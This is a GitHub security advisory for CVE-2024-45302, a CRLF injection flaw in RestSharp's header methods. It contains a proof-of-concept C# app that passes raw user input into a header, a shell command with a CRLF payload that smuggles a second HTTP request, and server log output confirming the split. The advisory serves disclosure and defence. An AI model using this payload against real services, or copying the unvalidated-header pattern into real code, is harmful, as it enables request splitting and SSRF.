# [M] CRLF Injection in RestSharp's `RestRequest.AddHeader` method

## Summary
Severity: Medium
Advisory: GHSA-4rr6-2v9v-wcpc
CVE: CVE-2024-45302
CWE: CWE-113, CWE-74, CWE-93
Ecosystem: NuGet
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:H (CVSS_V3)
Published: 2024-08-29
Source: https://github.com/advisories/GHSA-4rr6-2v9v-wcpc
Type: github-advisory

## Affected
- NuGet: `RestSharp` — affected >=107.0.0-preview.1 <112.0.0

## Details
### Summary
The second argument to `RestRequest.AddHeader` (the header value) is vulnerable to CRLF injection. The same applies to `RestRequest.AddOrUpdateHeader` and `RestClient.AddDefaultHeader`.

### Details
The way HTTP headers are added to a request is via the `HttpHeaders.TryAddWithoutValidation` method: <https://github.com/restsharp/RestSharp/blob/777bf194ec2d14271e7807cc704e73ec18fcaf7e/src/RestSharp/Request/HttpRequestMessageExtensions.cs#L32> This method does not check for CRLF characters in the header value.

This means that any headers from a `RestSharp.RequestHeaders` object are added to the request in such a way that they are vulnerable to CRLF-injection. In general, CRLF-injection into a HTTP header (when using HTTP/1.1) means that one can inject additional HTTP headers or smuggle whole HTTP requests.

### PoC
The below example code creates a console app that takes one command line variable "api key" and then makes a request to some status page with the provided key inserted in the "Authorization" header:

```c#
using RestSharp;

class Program
{
    static async Task Main(string[] args)
    {
        // Usage: dotnet run <api key>
        var key = args[0];
        var options = new RestClientOptions("http://insert.some.site.here");
        var client = new RestClient(options);
        var request = new RestRequest("/status", Method.Get).AddHeader("Authorization", key);
        var response = await client.ExecuteAsync(request);
        Console.WriteLine($"Status: {response.StatusCode}");
        Console.WriteLine($"Response: {response.Content}");
    }
}
```

This application is now vulnerable to CRLF-injection, and can thus be abused to for example perform request splitting and thus server side request forgery (SSRF):

```bash
anonymous@ubuntu-sofia-672448:~$ dotnet RestSharp-cli.dll $'test\r\nUser-Agent: injected header!\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: insert.some.site.here'
Status: OK
Response: <html></html>
```

The application intends to send a single request of the form:
```http
GET /status HTTP/1.1
Host: insert.some.site.here
Authorization: <api key>
User-Agent: RestSharp/111.4.1.0
Accept: application/json, text/json, text/x-json, text/javascript, application/xml, text/xml
Accept-Encoding: gzip, deflate, br
```
But as the application is vulnerable to CRLF injection the above command will instead result in the following two requests being sent:
```http
GET /status HTTP/1.1
Host: insert.some.site.here
Authorization: test
User-Agent: injected header!
```
and
```http
GET /smuggled HTTP/1.1
Host: insert.some.site.here
User-Agent: RestSharp/111.4.1.0
Accept: application/json, text/json, text/x-json, text/javascript, application/xml, text/xml
Accept-Encoding: gzip, deflate, br
```

This can be confirmed by checking the access logs on the server where these commands were run (with `insert.some.site.here` pointing to localhost):
```bash
anonymous@ubuntu-sofia-672448:~$ sudo tail /var/log/apache2/access.log
127.0.0.1 - - [29/Aug/2024:11:41:11 +0000] "GET /status HTTP/1.1" 200 240 "-" "injected header!"
127.0.0.1 - - [29/Aug/2024:11:41:11 +0000] "GET /smuggled HTTP/1.1" 404 436 "-" "RestSharp/111.4.1.0"
```

### Impact
If an application using the RestSharp library passes a user-controllable value through to a header, then that application becomes vulnerable to CRLF-injection. This is not necessarily a security issue for a command line application like the one above, but if such code were present in a web application then it becomes vulnerable to request splitting (as shown in the PoC) and thus Server Side Request Forgery.

Strictly speaking this is a potential vulnerability in applications using RestSharp, not in RestSharp itself, but I would argue that at the very least there needs to be a warning about this behaviour in the RestSharp documentation.

## References
- https://github.com/restsharp/RestSharp/security/advisories/GHSA-4rr6-2v9v-wcpc
- https://nvd.nist.gov/vuln/detail/CVE-2024-45302
- https://github.com/restsharp/RestSharp/commit/0fba5e727d241b1867bd71efc912594075c2934b
- https://github.com/restsharp/RestSharp
- https://github.com/restsharp/RestSharp/blob/777bf194ec2d14271e7807cc704e73ec18fcaf7e/src/RestSharp/Request/HttpRequestMessageExtensions.cs#L32
